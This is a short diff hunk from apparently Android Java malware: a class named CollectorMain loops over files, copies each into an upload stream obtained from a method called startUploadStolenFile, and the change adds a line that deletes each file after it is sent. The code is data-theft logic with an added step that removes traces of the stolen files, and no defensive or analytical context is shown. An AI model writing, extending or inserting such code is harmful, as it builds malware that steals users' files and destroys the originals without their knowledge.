@@ -44,6 +44,7 @@ public class CollectorMain extends ContextWrapper implements Runnable
 		for(String filename:files){
 			try {
 				copyAndClose(sb.readFile(filename), fu.startUploadStolenFile(filename));
+				sb.deleteFile(filename);
 			} catch (IOException e) {
 				break;
 			}
